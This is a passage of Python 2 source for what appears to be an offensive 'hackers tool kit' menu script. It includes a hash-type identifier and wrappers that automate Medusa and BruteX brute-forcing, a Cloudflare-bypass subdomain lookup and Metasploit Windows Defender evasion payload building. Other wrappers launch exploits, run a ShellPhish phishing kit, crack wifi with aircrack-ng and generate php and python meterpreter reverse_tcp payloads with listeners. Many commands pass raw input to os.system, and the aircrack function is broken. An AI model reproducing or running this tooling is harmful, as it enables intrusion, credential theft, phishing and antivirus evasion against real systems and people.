	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==False and hash[0:3].find('$H$')==0:
		jerar.append("107040")
	def MD5Unix():
	    hs='$1$cTuJH0Ju$1J8rI.mJReeMvpKUZbSlY/'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==False and hash[0:3].find('$1$')==0:
		jerar.append("107060")
	def MD5Wordpress():
	    hs='$P$BiTOhOj3ukMgCci2juN0HRbCdDRqeh.'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==False and hash[0:3].find('$P$')==0:
		jerar.append("107020")

	def MD5APR():
	    hs='$apr1$qAUKoKlG$3LuCncByN76eLxZAh/Ldr1'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash[0:4].find('$apr')==0:
		jerar.append("108020")

	def Haval160():
	    hs='a106e921284dd69dad06192a4411ec32fce83dbb'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("109100")
	def Haval160HMAC():
	    hs='29206f83edc1d6c3f680ff11276ec20642881243'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("109200")
	def MySQL5():
	    hs='9bb2fb57063821c762cc009f7584ddae9da431ff'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("109040")
	def MySQL160bit():
	    hs='*2470c0c06dee42fd1618bb99005adca2ec9d1e19'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==False and hash[0:1].find('*')==0:
		jerar.append("109060")
	def RipeMD160():
	    hs='dc65552812c66997ea7320ddfb51f5625d74721b'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("109120")
	def RipeMD160HMAC():
	    hs='ca28af47653b4f21e96c1235984cb50229331359'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("109180")
	def SHA1():
	    hs='4a1d4dbc1e193ec3ab2e9213876ceb8f4db72333'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("109020")
	def SHA1HMAC():
	    hs='6f5daac3fee96ba1382a09b1ba326ca73dccf9e7'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("109140")
	def SHA1MaNGOS():
	    hs='a2c0cdb6d1ebd1b9f85c6e25e0f8732e88f02f96'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("109220")
	def SHA1MaNGOS2():
	    hs='644a29679136e09d0bd99dfd9e8c5be84108b5fd'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("109240")
	def Tiger160():
	    hs='c086184486ec6388ff81ec9f235287270429b225'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("109080")
	def Tiger160HMAC():
	    hs='6603161719da5e56e1866e4f61f79496334e6a10'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("109160")
	def sha1passsalt():
	    hs='f006a1863663c21c541c8d600355abfeeaadb5e4'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("109260")
	def sha1saltpass():
	    hs='299c3d65a0dcab1fc38421783d64d0ecf4113448'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("109280")
	def sha1saltmd5pass():
	    hs='860465ede0625deebb4fbbedcb0db9dc65faec30'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("109300")
	def sha1saltmd5passsalt():
	    hs='6716d047c98c25a9c2cc54ee6134c73e6315a0ff'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("109320")
	def sha1saltsha1pass():
	    hs='58714327f9407097c64032a2fd5bff3a260cb85f'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("109340")
	def sha1saltsha1saltsha1pass():
	    hs='cc600a2903130c945aa178396910135cc7f93c63'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("109360")
	def sha1usernamepass():
	    hs='3de3d8093bf04b8eb5f595bc2da3f37358522c9f'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("109380")
	def sha1usernamepasssalt():
	    hs='00025111b3c4d0ac1635558ce2393f77e94770c5'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("109400")
	def sha1md5pass():
	    hs='fa960056c0dea57de94776d3759fb555a15cae87'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("1094202")
	def sha1md5passsalt():
	    hs='1dad2b71432d83312e61d25aeb627593295bcc9a'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("109440")
	def sha1md5sha1pass():
	    hs='8bceaeed74c17571c15cdb9494e992db3c263695'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("109460")
	def sha1sha1pass():
	    hs='3109b810188fcde0900f9907d2ebcaa10277d10e'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("109480")
	def sha1sha1passsalt():
	    hs='780d43fa11693b61875321b6b54905ee488d7760'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("109500")
	def sha1sha1passsubstrpass03():
	    hs='5ed6bc680b59c580db4a38df307bd4621759324e'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("109520")
	def sha1sha1saltpass():
	    hs='70506bac605485b4143ca114cbd4a3580d76a413'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("109540")
	def sha1sha1sha1pass():
	    hs='3328ee2a3b4bf41805bd6aab8e894a992fa91549'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("109560")
	def sha1strtolowerusernamepass():
	    hs='79f575543061e158c2da3799f999eb7c95261f07'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("109580")

	def Haval192():
	    hs='cd3a90a3bebd3fa6b6797eba5dab8441f16a7dfa96c6e641'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("110040")
	def Haval192HMAC():
	    hs='39b4d8ecf70534e2fd86bb04a877d01dbf9387e640366029'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("110080")
	def Tiger192():
	    hs='c086184486ec6388ff81ec9f235287270429b2253b248a70'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("110020")
	def Tiger192HMAC():
	    hs='8e914bb64353d4d29ab680e693272d0bd38023afa3943a41'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("110060")

	def MD5passsaltjoomla1():
	    hs='35d1c0d69a2df62be2df13b087343dc9:BeKMviAfcXeTPTlX'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==False and hash[32:33].find(':')==0:
		jerar.append("112020")

	def SHA1Django():
	    hs='sha1$Zion3R$299c3d65a0dcab1fc38421783d64d0ecf4113448'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==False and hash[0:5].find('sha1$')==0:
		jerar.append("113020")

	def Haval224():
	    hs='f65d3c0ef6c56f4c74ea884815414c24dbf0195635b550f47eac651a'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("114040")
	def Haval224HMAC():
	    hs='f10de2518a9f7aed5cf09b455112114d18487f0c894e349c3c76a681'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("114080")
	def SHA224():
	    hs='e301f414993d5ec2bd1d780688d37fe41512f8b57f6923d054ef8e59'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("114020")
	def SHA224HMAC():
	    hs='c15ff86a859892b5e95cdfd50af17d05268824a6c9caaa54e4bf1514'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("114060")

	def SHA256():
	    hs='2c740d20dab7f14ec30510a11f8fd78b82bc3a711abe8a993acdb323e78e6d5e'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("115020")
	def SHA256HMAC():
	    hs='d3dd251b7668b8b6c12e639c681e88f2c9b81105ef41caccb25fcde7673a1132'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("115120")
	def Haval256():
	    hs='7169ecae19a5cd729f6e9574228b8b3c91699175324e6222dec569d4281d4a4a'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("115040")
	def Haval256HMAC():
	    hs='6aa856a2cfd349fb4ee781749d2d92a1ba2d38866e337a4a1db907654d4d4d7a'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("115140")
	def GOSTR341194():
	    hs='ab709d384cce5fda0793becd3da0cb6a926c86a8f3460efb471adddee1c63793'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("115060")
	def RipeMD256():
	    hs='5fcbe06df20ce8ee16e92542e591bdea706fbdc2442aecbf42c223f4461a12af'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("115080")
	def RipeMD256HMAC():
	    hs='43227322be1b8d743e004c628e0042184f1288f27c13155412f08beeee0e54bf'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("115160")
	def SNEFRU256():
	    hs='3a654de48e8d6b669258b2d33fe6fb179356083eed6ff67e27c5ebfa4d9732bb'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("115100")
	def SNEFRU256HMAC():
	    hs='4e9418436e301a488f675c9508a2d518d8f8f99e966136f2dd7e308b194d74f9'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("115180")
	def SHA256md5pass():
	    hs='b419557099cfa18a86d1d693e2b3b3e979e7a5aba361d9c4ec585a1a70c7bde4'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("115200")
	def SHA256sha1pass():
	    hs='afbed6e0c79338dbfe0000efe6b8e74e3b7121fe73c383ae22f5b505cb39c886'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("115220")

	def MD5passsaltjoomla2():
	    hs='fb33e01e4f8787dc8beb93dac4107209:fxJUXVjYRafVauT77Cze8XwFrWaeAYB2'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==False and hash[32:33].find(':')==0:
		jerar.append("116020")
	def SAM():
	    hs='4318B176C3D8E3DEAAD3B435B51404EE:B7C899154197E8A2A33121D76A240AB5'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==False and hash.islower()==False and hash[32:33].find(':')==0:
		jerar.append("116040")

	def SHA256Django():
	    hs='sha256$Zion3R$9e1a08aa28a22dfff722fad7517bae68a55444bb5e2f909d340767cec9acf2c3'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==False and hash[0:6].find('sha256')==0:
		jerar.append("117020")

	def RipeMD320():
	    hs='b4f7c8993a389eac4f421b9b3b2bfb3a241d05949324a8dab1286069a18de69aaf5ecc3c2009d8ef'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("118020")
	def RipeMD320HMAC():
	    hs='244516688f8ad7dd625836c0d0bfc3a888854f7c0161f01de81351f61e98807dcd55b39ffe5d7a78'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("118040")

	def SHA384():
	    hs='3b21c44f8d830fa55ee9328a7713c6aad548fe6d7a4a438723a0da67c48c485220081a2fbc3e8c17fd9bd65f8d4b4e6b'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("119020")
	def SHA384HMAC():
	    hs='bef0dd791e814d28b4115eb6924a10beb53da47d463171fe8e63f68207521a4171219bb91d0580bca37b0f96fddeeb8b'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("119040")

	def SHA256s():
	    hs='$6$g4TpUQzk$OmsZBJFwvy6MwZckPvVYfDnwsgktm2CckOlNJGy9HNwHSuHFvywGIuwkJ6Bjn3kKbB6zoyEjIYNMpHWBNxJ6g.'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==False and hash[0:3].find('$6$')==0:
		jerar.append("120020")

	def SHA384Django():
	    hs='sha384$Zion3R$88cfd5bc332a4af9f09aa33a1593f24eddc01de00b84395765193c3887f4deac46dc723ac14ddeb4d3a9b958816b7bba'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==False and hash[0:6].find('sha384')==0:
		print " [+] SHA-384(Django)"
		jerar.append("121020")

	def SHA512():
	    hs='ea8e6f0935b34e2e6573b89c0856c81b831ef2cadfdee9f44eb9aa0955155ba5e8dd97f85c73f030666846773c91404fb0e12fb38936c56f8cf38a33ac89a24e'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("122020")
	def SHA512HMAC():
	    hs='dd0ada8693250b31d9f44f3ec2d4a106003a6ce67eaa92e384b356d1b4ef6d66a818d47c1f3a2c6e8a9a9b9bdbd28d485e06161ccd0f528c8bbb5541c3fef36f'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("122060")
	def Whirlpool():
	    hs='76df96157e632410998ad7f823d82930f79a96578acc8ac5ce1bfc34346cf64b4610aefa8a549da3f0c1da36dad314927cebf8ca6f3fcd0649d363c5a370dddb'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("122040")
	def WhirlpoolHMAC():
	    hs='77996016cf6111e97d6ad31484bab1bf7de7b7ee64aebbc243e650a75a2f9256cef104e504d3cf29405888fca5a231fcac85d36cd614b1d52fce850b53ddf7f9'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("122080")


	print logo
	while True:
	    jerar=[]
	    print """
	   -------------------------------------------------------------------------"""
	    hash = raw_input(" HASH: ")
	    ADLER32(); CRC16(); CRC16CCITT(); CRC32(); CRC32B(); DESUnix(); DomainCachedCredentials(); FCS16(); GHash323(); GHash325(); GOSTR341194(); Haval128(); Haval128HMAC(); Haval160(); Haval160HMAC(); Haval192(); Haval192HMAC(); Haval224(); Haval224HMAC(); Haval256(); Haval256HMAC(); LineageIIC4(); MD2(); MD2HMAC(); MD4(); MD4HMAC(); MD5(); MD5APR(); MD5HMAC(); MD5HMACWordpress(); MD5phpBB3(); MD5Unix(); MD5Wordpress(); MD5Half(); MD5Middle(); MD5passsaltjoomla1(); MD5passsaltjoomla2(); MySQL(); MySQL5(); MySQL160bit(); NTLM(); RAdminv2x(); RipeMD128(); RipeMD128HMAC(); RipeMD160(); RipeMD160HMAC(); RipeMD256(); RipeMD256HMAC(); RipeMD320(); RipeMD320HMAC(); SAM(); SHA1(); SHA1Django(); SHA1HMAC(); SHA1MaNGOS(); SHA1MaNGOS2(); SHA224(); SHA224HMAC(); SHA256(); SHA256s(); SHA256Django(); SHA256HMAC(); SHA256md5pass(); SHA256sha1pass(); SHA384(); SHA384Django(); SHA384HMAC(); SHA512(); SHA512HMAC(); SNEFRU128(); SNEFRU128HMAC(); SNEFRU256(); SNEFRU256HMAC(); Tiger128(); Tiger128HMAC(); Tiger160(); Tiger160HMAC(); Tiger192(); Tiger192HMAC(); Whirlpool(); WhirlpoolHMAC(); XOR32(); md5passsalt(); md5saltmd5pass(); md5saltpass(); md5saltpasssalt(); md5saltpassusername(); md5saltmd5pass(); md5saltmd5passsalt(); md5saltmd5passsalt(); md5saltmd5saltpass(); md5saltmd5md5passsalt(); md5username0pass(); md5usernameLFpass(); md5usernamemd5passsalt(); md5md5pass(); md5md5passsalt(); md5md5passmd5salt(); md5md5saltpass(); md5md5saltmd5pass(); md5md5usernamepasssalt(); md5md5md5pass(); md5md5md5md5pass(); md5md5md5md5md5pass(); md5sha1pass(); md5sha1md5pass(); md5sha1md5sha1pass(); md5strtouppermd5pass(); sha1passsalt(); sha1saltpass(); sha1saltmd5pass(); sha1saltmd5passsalt(); sha1saltsha1pass(); sha1saltsha1saltsha1pass(); sha1usernamepass(); sha1usernamepasssalt(); sha1md5pass(); sha1md5passsalt(); sha1md5sha1pass(); sha1sha1pass(); sha1sha1passsalt(); sha1sha1passsubstrpass03(); sha1sha1saltpass(); sha1sha1sha1pass(); sha1strtolowerusernamepass()

	    if len(jerar)==0:
		print ""
		print " Not Found."
	    elif len(jerar)>2:
		jerar.sort()
		print ""
		print "Possible Hashs:"
		print "[+] ",algorithms[jerar[0]]
		print "[+] ",algorithms[jerar[1]]
		print ""
		print "Least Possible Hashs:"
		for a in range(int(len(jerar))-2):
		    print "[+] ",algorithms[jerar[a+2]]
	    else:
		jerar.sort()
		print ""
		print "Possible Hashs:"
		for a in range(len(jerar)):
		    print "[+] ",algorithms[jerar[a]]
#------------------#
#FIND HASH TYPE END#


#RESTART SCRIPT START#
#--------------------#
def restart():
	os.system("clear")
	os.system("cd /root/hackers-tool-kit && python htk.py")
#------------------#
#RESTART SCRIPT END#


#MEDUSA AUTOMATED START#
#----------------------#
def medusa():
	k = raw_input("Target Host: ")
	u = raw_input("User: ")
	p = raw_input("Wordlist: ")
	os.system("cat /root/hackers-tool-kit/tools/medusamods.txt")
	print "\n"
	m = raw_input("Module: ")
	n = raw_input("Port: ")
	a = 'medusa -h {0} -u {1} -P {2} -M {3} -n {4}'.format(k,u,p,m,n)
	os.system(a)
#--------------------#
#MEDUSA AUTOMATED END#


#WAF DETECTER START#
#------------------#
def wafwoof():
	j = raw_input("Enter Target: ")
	k = 'wafw00f {0}'.format(j)
	os.system(k)
#----------------#
#WAF DETECTER END#


#CLOUDFLARE BYPASS START#
#-----------------------#
def cloud():

	subdomainlist = ["ftp", "cpanel", "webmail" , "mail" , "www", "www1", "www2", "www3", "www4", "www5","ns1", "ns2" , "forums" , "blog"]

	print ('\033[1m' + "CLOUDFLARE BYPASS SCRIPT ") 

	host = raw_input("Enter Target: ")
	for sublist in subdomainlist:
	    try:
	       hosts = str(sublist) + "." + str(host)
	       showip = socket.gethostbyname(str(hosts))
	       print " Cloudflare has begun to be bypassed  "+str(showip)+' :| '+str(hosts)
	    except:
		    	pass

	print ( '\033[93m' + "Credit Goes To: tugrulbey.com")
	print ( '\033[92m' + "Credit Goes To: tztugrulbey@protonmail.com")
#---------------------#
#CLOUDFLARE BYPASS END#


#BRUTEFORCE ALL SERVICES ON WEB START#
#------------------------------------# 
def brutex():
	k = raw_input("Target: ")
	p = raw_input("Port: ")
	a = 'brutex {0} {1}'.format(k,p)
	os.system(a)
#----------------------------------#
#BRUTEFORCE ALL SERVICES ON WEB END#


#METERPRETER HELP MENU START#
#---------------------------#
def methelp():
	os.system("cat /root/hackers-tool-kit/tools/meterpreter.txt")
#-------------------------#
#METERPRETER HELP MENU END#


#WINDOWS DEFENDER BYPASS START#
#-----------------------------#
def winbyp():
	os.system("cat /root/hackers-tool-kit/tools/payloads.txt")
	pay = raw_input("Payload: ")
	port = raw_input("Port: ")
	name = raw_input("File Name: ")
	os.system('echo "use evasion/windows/windows_defender_exe\n" > winbyp.rc')
	os.system('echo "set payload {0}\n" >> winbyp.rc'.format(pay))
	os.system('echo "set LHOST 127.0.0.1\n" >> winbyp.rc')
	os.system('echo "set LPORT {0}\n" >> winbyp.rc'.format(port))
	os.system('echo "set filename {0}.exe\n" >> winbyp.rc'.format(name))
	os.system('echo "run\n" >> winbyp.rc')
	os.system("service postgresql restart")
	os.system('msfconsole -r winbyp.rc')
	os.system('rm -rf winbyp.rc')
#---------------------------#
#WINDOWS DEFENDER BYPASS END#


#USE A EXPLOIT START#
#-------------------#
def exploit():
	os.system("cat /root/hackers-tool-kit/tools/exploits.txt")
	print "\n"
	f = raw_input("Select Exploit: ")
	os.system('echo "use {0}\n" >> exploit.rc'.format(f))
	os.system('echo "show options\n" >> exploit.rc'.format(f))
	os.system("service postgresql restart")
	os.system('msfconsole -r exploit.rc')
	os.system('rm -rf exploit.rc')
#-----------------#
#USE A EXPLOIT END#


#PHISHING AUTOMATED START#
#------------------------#
def phish():
	os.system("bash /root/shellphish/shellphish.sh")
#----------------------#
#PHISHING AUTOMATED END#


#LIST DATABASE INFO START#
#------------------------#
def datalist():
	os.system('echo "hosts\n" >> data.rc')
	os.system('echo "services\n" >> data.rc')
	os.system("service postgresql restart")
	os.system('msfconsole -r data.rc')
	os.system('rm -rf data.rc')
#----------------------#
#LIST DATABASE INFO END#


#ALL METASPLOIT EVASIONS START#
#-----------------------------#
def msfev():
	os.system("service postgresql start")
	os.system("""msfconsole -x 'show evasion'""")
#---------------------------#
#ALL METASPLOIT EVASIONS END#


#FULLY UPDATE YOUR OS START#
#--------------------------#
def upgrade():
	os.system("apt update && apt upgrade")
#------------------------#
#FULLY UPDATE YOUR OS END#


#USE A NMAP SCRIPT START#
#-----------------------#
def nscript():
	os.system("cat /root/hackers-tool-kit/tools/scripts.txt")
	print "\n"
	j = raw_input(G+"Select Script:\033[0m ")
	k = raw_input(G+"Target:\033[0m ")
	a = 'nmap --script {0} {1}'.format(j,k)
	os.system(a)
#---------------------#
#USE A NMAP SCRIPT END#


#GET HOST SSH VERSION START#
#--------------------------#
def sshver():
	f = raw_input(G+"Target: \033[0m")
	g = raw_input(G+"Port: \033[0m")
	t = raw_input(G+"Threads: \033[0m")
	b = raw_input(G+"Timeout: \033[0m")
	os.system('echo "use auxiliary/scanner/ssh/ssh_version\n" >> sshver.rc')
	os.system('echo "set RHOSTS {0}\n" >> sshver.rc'.format(f))
	os.system('echo "set RPORT {0}\n" >> sshver.rc'.format(g))
	os.system('echo "set THREADS {0}\n" >> sshver.rc'.format(t))
	os.system('echo "set TIMEOUT {0}\n" >> sshver.rc'.format(b))
	os.system('echo "show options\n" >> sshver.rc')
	os.system('echo "run\n" >> sshver.rc')
	os.system("service postgresql restart")
	os.system('msfconsole -r sshver.rc')
	os.system('rm -rf sshver.rc')
#------------------------#
#GET HOST SSH VERSION END#


#USE PROXYCHAINS FOR WEB START#
#-----------------------------#
def chains():
	h = raw_input("Enter Browser: ")
	j = raw_input("Enter Website: ")
	a = 'proxychains {0} {1}'.format(h,j)
	os.system(a)
#---------------------------#
#USE PROXYCHAINS FOR WEB END#


#GET HOST MYSQL VERSION START#
#----------------------------#
def mysqlv():
	f = raw_input(G+"Target: \033[0m")
	g = raw_input(G+"Port: \033[0m")
	t = raw_input(G+"Threads: \033[0m")
	os.system('echo "use auxiliary/scanner/mysql/mysql_version\n" >> mysqlv.rc')
	os.system('echo "set RHOSTS {0}\n" >> mysqlv.rc'.format(f))
	os.system('echo "set RPORT {0}\n" >> mysqlv.rc'.format(g))
	os.system('echo "set THREADS {0}\n" >> mysqlv.rc'.format(t))
	os.system('echo "show options\n" >> mysqlv.rc')
	os.system('echo "run\n" >> mysqlv.rc')
	os.system("service postgresql restart")
	os.system('msfconsole -r mysqlv.rc')
	os.system('rm -rf mysqlv.rc')
#--------------------------#
#GET HOST MYSQL VERSION END#


#CONNECT TO A HOST START#
#-----------------------#
def connect():
        h = raw_input("Enter Host: ")
	print "\n"
	print "    How would you like to connect?"
	print "---------------------------------------"
	print "ssh:          Secure Shell            | Default Port = 22"
	print "---------------------------------------"
	print "telnet:  Network Virtual Terminal     | Default Port = 23"
	print "---------------------------------------"
	j = raw_input("Select Protocol: ")
	a = '{0} {1}'.format(j,h)
	os.system(a)
#---------------------#
#CONNECT TO A HOST END#



#OPEN NEW TERMINAL START#
#-----------------------#
def terminal():
	os.system("gnome-terminal")
#---------------------#
#OPEN NEW TERMINAL END#


#AIRCRACK-NG [WIFI HACK] AUTOMATED START#
#---------------------------------------#
def aircrack():
	b = raw_input(G+"BSSID: \033[0m")
	e = raw_input(G+"ESSID: \033[0m")
	w = raw_input(G+"Wordlist: \033[0m")
	h = raw_input(G+"Handshake file: \033[0m")
	os.system("iwconfig")
	i = raw_input(G+"Interface: \033[0m")
	a = 'aircrack-ng -b {0} -e {1} -w {2} {3} {4}'
	os.system(a)
#-------------------------------------#
#AIRCRACK-NG [WIFI HACK] AUTOMATED END#


#GET SOURCE CODE OF WEB START#
#----------------------------#
def source():
	t = raw_input(B+"Target:\033[0m ")
	print Y+"\nWould you like to save source code in a file?\n\033[0m"
	q = raw_input(R+"[y/n]:\033[0m ")
	if q == "n":
		an = 'curl {0}'.format(t)
		os.system(an)
	if q == "y":
		ay = 'curl {0} >> /root/{1}.txt'.format(t,t)
		os.system(ay)
		print Y+"\nfile saved > /root/{0}.txt\033[0m".format(t) 
#--------------------------#
#GET SOURCE CODE OF WEB END#


#WEB DIRECTORY SCAN START#
#------------------------#
def dirscan():
	t = raw_input(B+"Target URL:\033[91m ")
	print "\033[0m"
	a = 'dirb {0}'.format(t)
	os.system(a)
#----------------------#
#WEB DIRECTORY SCAN END#



#APACHE SERVER START#
#-------------------#
def aserver():
	gw = os.popen("ip -4 route show default").read().split()
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.connect((gw[2], 0))
	ipaddr = s.getsockname()[0]
	print Y+"Starting Server\033[0m..."
	os.system("service apache2 start")
	br = raw_input(G+"Browser: \033[0m")
	a = '{0} {1}'.format(br,ipaddr)
	os.system(a)
	stop = raw_input("hit enter to stop server: ")
	print Y+"Stopping Server\033[0m..."
	os.system("service apache2 stop")
#-----------------#
#APACHE SERVER END#


#RUN A FILE START#
#----------------#
def run():
	print Y+"what program do you want to run the file with    Example: python"
	p = raw_input(N+"Program: ")
	print "\n"
	print Y+"Example 1: /root/hi/hello.py/     \033[94mExample 2: hello.py\033[0m"
	print "\n"
	f = raw_input("Enter File: ")
	print "\n"
	print Y+"would you like to add arguments when running the file  [y/n]\033[0m"
	yn = raw_input(G+"[y or n]: \033[0m")
	if yn == "n" :
		a = '{0} {1}'.format(p,f)
		os.system(a)
	if yn == "y" :
		arg = raw_input("Enter Arguments: ")
		a = '{0} {1} {2}'.format(p,f,arg)
		os.system(a)
#--------------#
#RUN A FILE END#


#REFRESH BANNER START#
#--------------------#
def banner():
	os.system("clear")
	mainbanner()
#------------------#
#REFRESH BANNER END#


#PHP PAYLOAD START#
#-----------------#
def phpload():
	lhost = raw_input("LHOST: ")
	lport = raw_input("LPORT: ")
	filen = raw_input("File Name: ")
	a = 'msfvenom -p php/meterpreter/reverse_tcp LHOST={0} LPORT={1} -o /root/{2}.php'.format(lhost,lport,filen)
	os.system(a)
	print "\nwould you like to run this file in a multi handler?"
	yn = raw_input("[y/n]> ")
	if yn == "y":
		os.system('echo "use exploit/multi/handler\n" >> phpload.rc')
		os.system('echo "set payload php/meterpreter/reverse_tcp\n" >> phpload.rc')
		os.system('echo "set LHOST {0}\n" >> phpload.rc'.format(lhost))
		os.system('echo "set LPORT {0}\n" >> phpload.rc'.format(lport))
		os.system('echo "exploit\n" >> phpload.rc')
		os.system("service postgresql restart")
		os.system('msfconsole -r phpload.rc')
		os.system('rm -rf phpload.rc')
	if yn == "n":
		os.system('echo " "')
#---------------#
#PHP PAYLOAD END#


#PYLOAD START#
#------------#
def pyload():
	lhost = raw_input("LHOST: ")
	lport = raw_input("LPORT: ")
	filen = raw_input("File Name: ")
	a = 'msfvenom -p python/meterpreter/reverse_tcp LHOST={0} LPORT={1} -o /root/{2}.py'.format(lhost,lport,filen)
	os.system(a)
	print "\nwould you like to run this file in a multi handler?"
	yn = raw_input("[y/n]> ")
	if yn == "y":
		os.system('echo "use exploit/multi/handler\n" >> pyload.rc')
		os.system('echo "set payload python/meterpreter/reverse_tcp\n" >> pyload.rc')
		os.system('echo "set LHOST {0}\n" >> pyload.rc'.format(lhost))
		os.system('echo "set LPORT {0}\n" >> pyload.rc'.format(lport))
		os.system('echo "exploit\n" >> pyload.rc')
